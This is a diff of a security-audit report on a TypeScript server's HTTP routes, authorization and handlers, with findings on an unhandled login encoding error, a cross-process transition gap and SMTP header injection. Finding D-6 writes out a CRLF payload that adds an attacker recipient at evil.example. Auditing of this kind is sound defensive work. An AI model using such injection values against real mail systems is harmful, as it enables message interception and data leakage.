@@ -1,6 +1,6 @@
 # Area D: HTTP, auth, handlers
 
-Baseline: HEAD `5f41cd8a`. Read in full: `src/http/server.ts`, `routes.ts`,
+State: HEAD `5f41cd8a`. Read in full: `src/http/server.ts`, `routes.ts`,
 `admin-routes.ts`, `studio-routes.ts`, `reporting-routes.ts`,
 `account-routes.ts`, `static.ts`, `metrics.ts`, `errors.ts`. Also read in full:
 `src/auth/` (`authorize.ts`, `grants.ts`, `process-access.ts`, `groups.ts`,
@@ -22,7 +22,7 @@ four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
     rate-limit attempt (`:142`, `:146`) and calls `verifyLogin` (`:148`).
   - The query `SELECT ... WHERE email = ${email}` (`src/auth/users.ts:91`)
     passes the value to Postgres as a text parameter. Postgres rejects it
-    (assumed: SQLSTATE 22021, an invalid byte sequence for UTF8).
+    (assumed: a database encoding error (SQLSTATE 22021)).
   - No code catches the error. The handler `handleLogin` wraps only
     `req.json()` in a try (`login.ts:125-129`). The route closure calls it
     directly (`server.ts:561-566`). The dispatcher calls `route.handler`
@@ -122,9 +122,9 @@ four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
 - Location: `src/handlers/instance-transition.ts:62-143`,
   `src/engine/definitions.ts:401-406`, `:448-461`
 - Severity: medium (precondition: the author binds the field freely, and the
-  participant knows a target id. Instance ids are UUIDv4. A participant knows
-  them, for example, from own cases, comments or `instance.query` options of
-  other steps.)
+  participant knows a target id. Instance ids are UUIDv4, but a participant
+  can still know one. Sources include own cases, comments or `instance.query`
+  options of other steps.)
 - Evidence: confirmed in code. Exploitability depends on the published body
   (repro R-3).
 - Counter-evidence sought: the publish checks (`definitions.ts:373-461`). The
@@ -204,7 +204,7 @@ four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
 ### D-6: The account email is never checked as an address; CRLF reaches the SMTP command and the `To:` header
 
 - Case:
-  - An operator creates an account through `POST /admin/users` with
+  - An operator adds an account through `POST /admin/users` with
     `email: "a@x.ch>\r\nRCPT TO:<leak@evil.example"`. The route checks only
     "string, not empty after trim" (`src/http/admin-routes.ts:189-193`,
     `:212`).
@@ -357,7 +357,7 @@ the check on the instance, process or report.
 | `GET /reporting/:pid/{cycle-time,bottleneck,sla}` | `reporting-routes.ts:140` | REPORTS + `read` (`:130-133`) | process | ok |
 | `/reporting/reports*` (9) | `reporting-routes.ts:176-285` | REPORTS | `getReport`/`executeReport`/preview in the runtime (not read in D) | ok at the HTTP edge, D-2 |
 | `GET /drafts` | `studio-routes.ts:121` | ADMIN or authoring, filtered by the developer list | yes | ok |
-| `GET/PUT/DELETE /drafts/:pid`, `POST …/instances` | `studio-routes.ts:138/169/206/250` | new draft: authoring (+CREATE on PUT); otherwise developer list or ADMIN | yes | ok |
+| `GET/PUT/DELETE /drafts/:pid`, `POST …/instances` | `studio-routes.ts:138/169/206/250` | new draft: authoring (+`CREATE` on PUT); otherwise developer list or ADMIN | yes | ok |
 | `POST /drafts/:pid/publish` | `studio-routes.ts:299` | authoring + `publish` | no developer list | D-5 |
 | `GET /processes/:pid/versions/:v` | `studio-routes.ts:352` | `requireStudioRead` | - | ok per comment/spec |
 | `GET/PUT /migration-plans/…`, `GET …/orphan-keys` | `studio-routes.ts:371/389/408` | `migrate` | process | ok |
@@ -416,7 +416,7 @@ specs. Every `route()` call awaits its gate (`routes.ts:238-242`). The tree
 - Path traversal in `static.ts`: decode, resolve, prefix check with `sep`
   (`static.ts:63-74`), NUL rejected (`:70`). A backslash under Windows falls
   under `resolve` plus the prefix check. Symlinks follow `statSync`, and the
-  compile step of the web package controls the content of `dist`. Attachments live in the database, with
+  build controls the content of `dist`. Attachments live in the database, with
   no path.
 - Attachments and XSS, the SEC-8 assumptions (`docs/decisions.md:719`): they
   hold. The server sends `nosniff` plus `Content-Disposition: attachment` with
@@ -472,9 +472,9 @@ specs. Every `route()` call awaits its gate (`routes.ts:238-242`). The tree
   line `=1+1\r\n` without a prefix.
 - R-3 (D-3): a process B with a manual path. A process A whose
   `instance.transition` action reads its target id from a free text field. The
-  author of A
-  holds `read` on B. Expected per the finding: a participant without a role in
-  B moves a B instance past that path. The record then shows the event
+  author of A holds `read` on B. Expected per the finding: a participant moves
+  a B instance past that path. The participant has no role and is not a
+  candidate in B. The record then shows the event
   `instance.transitioned-by-action`.
 - R-4 (D-4): an SMTP stub that answers `452 4.5.3 Too many recipients` from the
   101st `RCPT` on. A group with 150 active members as `org.group-members`. An
